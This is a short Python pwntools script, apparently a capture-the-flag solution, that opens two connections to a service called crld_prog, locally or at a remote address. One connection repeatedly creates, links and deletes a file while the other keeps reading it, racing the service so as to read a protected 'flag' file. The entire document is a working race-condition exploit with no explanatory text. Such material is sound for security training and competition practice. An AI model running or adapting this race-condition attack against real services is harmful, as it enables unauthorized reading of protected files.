from pwn import *
import sys
from multiprocessing import Process
import time

if len(sys.argv) == 1:
    r1 = process('./crld_prog')
    r2= process('./crld_prog')
else:
    r1 = remote('35.200.197.38',8018)
    r2 = remote('35.200.197.38',8018)

def menu(r,skip=True):
    v=  r.recvuntil('Command: ')
    # Skip printing certain output
    if not skip and "Illegal" not in v and "dummy" not in v and "Exist" not in v and "Created" not in v and "Deleted" not in v and "Error" not in v:
        print v

def read(r,fn):
    r.sendline('read {}'.format(fn))
    menu(r, False)
def link(r,link, fn):
    r.sendline("link {} {}".format(fn, link))
    menu(r)

def create(r,fn, contents):
    r.sendline("create {} {}".format(fn, contents))
    menu(r)
def delete(r,fn):
    r.sendline("delete {}".format(fn))
    menu(r)

def readLinkLoop(r, link_name):
    for i in range(0,100): #this runs faster then the modlinkloop so let's make it run a little longer
        read(r, link_name)
def modLinkLoop(r, desired, link_name):
    for i in range(0, 50):
        create(r1, link_name, "dummy")
        link(r, link_name, desired)
        time.sleep(0.001)
        delete(r,link_name)

menu(r1)
menu(r2)
fn = "XVFDetest" #some file name another team probably won't use
p1 = Process(target=readLinkLoop, args=(r2, fn))
p2 = Process(target=modLinkLoop, args=(r1, "flag", fn))
p2.start()
p1.start()
p1.join()
p2.join()
r1.close()
r2.close()
